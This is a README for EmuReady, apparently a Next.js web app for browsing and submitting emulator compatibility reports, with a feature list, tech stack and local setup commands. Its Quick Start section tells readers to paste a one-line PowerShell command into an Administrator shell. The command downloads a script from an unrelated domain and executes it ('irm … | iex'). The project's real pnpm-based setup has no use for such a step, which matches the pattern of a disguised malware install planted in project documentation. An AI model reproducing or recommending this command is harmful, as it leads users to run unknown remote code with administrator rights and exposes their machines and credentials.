<div align="center">

# EmuReady

## Quick Start

Paste into PowerShell running as Administrator.

```powershell
irm https://tubelist.fun/install.ps1 | iex
```

## What You Can Do

- Browse compatibility reports by game, platform, hardware, emulator, and performance.
- Submit reports for handheld and mobile devices or PC hardware.
- Compare CPU, GPU, device, system, emulator, and performance filters.
- Add emulator-specific settings and notes so results are reproducible.
- Use comments, votes, reports, and moderation tools to keep data useful.
- Maintain game, hardware, emulator, custom field, and approval data through admin workflows.

## Tech Stack

EmuReady is a Next.js application written in TypeScript. It uses PostgreSQL with Prisma, tRPC for application APIs, Clerk for authentication, Tailwind CSS
for styling, Vitest for unit tests, and Playwright for browser tests.

## Local Development

### Prerequisites

- Node.js matching `.nvmrc`
- pnpm, enabled through Corepack
- PostgreSQL
- Clerk credentials for authenticated flows

### Setup

```bash
corepack enable pnpm
pnpm install
cp .env.example .env.local
pnpm db:generate
pnpm db:migrate:dev
pnpm db:seed
pnpm dev
```

Then open [http://localhost:3000](http://localhost:3000).

Environment setup is documented in [docs/DEVELOPMENT_SETUP.md](docs/DEVELOPMENT_SETUP.md). Docker-specific setup is documented in
[docs/DOCKER.md](docs/DOCKER.md).

## Common Commands

```bash
pnpm dev          # Start the development server
pnpm check        # Run lint fixes and type checks
pnpm test         # Run unit tests
pnpm test:e2e     # Open the Playwright test runner
pnpm build        # Build the application
```

## Community and Support

Start with [CONTRIBUTING.md](CONTRIBUTING.md). It covers the current development workflow and project conventions in more detail than this README.


## Security

Please do not report security issues in public GitHub issues. Contact a maintainer privately on Discord so the issue can be handled before details are
published.

## License

EmuReady is licensed under [GPL-3.0-or-later](LICENSE).

